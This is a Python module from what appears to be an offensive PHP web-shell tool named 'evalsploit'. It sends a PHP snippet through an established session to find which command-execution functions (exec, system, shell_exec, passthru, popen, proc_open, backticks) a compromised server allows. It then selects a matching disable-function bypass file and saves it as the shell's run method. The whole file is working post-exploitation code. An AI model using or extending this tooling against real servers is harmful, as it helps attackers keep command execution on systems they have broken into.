"""try: check available execution methods; 'try run' sets first working."""

from __future__ import annotations

from pathlib import Path
from typing import TYPE_CHECKING, Optional

from evalsploit.config import project_root
from evalsploit.modules.registry import register
from evalsploit.modules.base import Module

if TYPE_CHECKING:
    from evalsploit.context import SessionContext


# Same order as run_mod EXEC_NAMES; first available with bypass file wins
PREFERRED_ORDER = (
    "exec", "shell_exec", "system", "passthru", "popen",
    "proc_open", "expect_popen", "pcntl_exec", "do",
)

# PHP that replicates try.php: output comma-separated list of available methods
TRY_RUN_PHP = r"""
if (function_exists('exec') && is_callable('exec')) { echo "exec,"; }
if (function_exists('system') && is_callable('system')) { echo "system,"; }
if (function_exists('shell_exec') && is_callable('shell_exec')) { echo "shell_exec,"; }
if (function_exists('passthru') && is_callable('passthru')) { echo "passthru,"; }
if (function_exists('popen') && is_callable('popen')) { echo "popen,"; }
if (function_exists('expect_popen') && is_callable('expect_popen')) { echo "expect_popen,"; }
if (function_exists('proc_open') && is_callable('proc_open')) { echo "proc_open,"; }
if (function_exists('pcntl_exec') && is_callable('pcntl_exec')) { echo "pcntl_exec,"; }
if ($r = @`echo 1`) { echo "do,"; }
"""


@register("try", description="Detect available exec methods on server, set the best one", usage="try run")
class TryModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        arg = args.strip().lower()
        if arg != "run":
            print("Usage: try run  - detect available exec methods and set first working.")
            return None

        out = ctx.send(TRY_RUN_PHP).strip()
        available = [s.strip() for s in out.split(",") if s.strip()]

        if not available:
            print("No exec method available on server.")
            return None

        bypass_dir = project_root() / "bypasses" / "exec"
        chosen = None
        for name in PREFERRED_ORDER:
            if name in available and (bypass_dir / f"{name}.php").exists():
                chosen = name
                break

        if chosen is None:
            print("Available:", ", ".join(available))
            print("No matching bypass file in bypasses/exec/ for any of them.")
            return None

        ctx.config.run_shell = chosen
        ctx.config.save_global()
        print("Available:", ", ".join(available))
        print(f"Set run: {chosen}")
        return None


register("detect")(TryModule)
